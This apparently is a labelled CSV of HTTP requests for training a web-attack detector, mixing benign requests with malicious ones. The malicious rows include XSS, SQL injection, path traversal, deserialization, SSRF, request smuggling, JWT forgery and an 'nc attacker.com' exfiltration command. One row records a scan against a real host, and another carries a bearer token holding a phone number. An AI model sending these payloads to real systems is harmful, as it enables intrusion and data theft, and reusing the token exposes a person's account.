method,path,query,headers,body,ua,label
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/web-api/orders/f434bfa2-de26-43dc-897d-77717f3d8377,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzU0MTc2NDAiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZWE3ODNjOGUtYjE5Zi00MWM3LWFlODAtZGYwNDc0NTZmMzJmIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzU0MTc2NDAiLCJzdWIiOiJXRUJTSVRFQDA3NzU0MTc2NDAiLCJpYXQiOjE3NzA2MzAyMzcsImV4cCI6MTc3MTIzNTAzN30.eSi52KRoIT4ts4MDMdTBrSLQBpDpxxB9kazldHEFe5Q; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: c65c3e6e-2d09-4f91-8c44-410285c27ec6",,python-requests/2.32.5,0
DELETE,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,id=1&id=2,,,1
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
POST,/login,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,sqlmap/1.5.2,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,GET /user/profile,,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,id=1&id=2,,,1
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,GET /user/profile,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,`uname -a`,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,send=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-send%27%29%3E&attachment_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-attachment_id%27%29%3E&wp_screen_options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-wp_screen_options%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-page_id%27%29%3E&locale=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-locale%27%29%3E&function=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-function%27%29%3E&profile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-profile%27%29%3E&day=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-day%27%29%3E&folder=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-folder%27%29%3E&mobile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mobile%27%29%3E&settings=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings%27%29%3E&comments=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comments%27%29%3E&all=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-all%27%29%3E&menu=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu%27%29%3E,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0,1
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
POST,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
DELETE,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
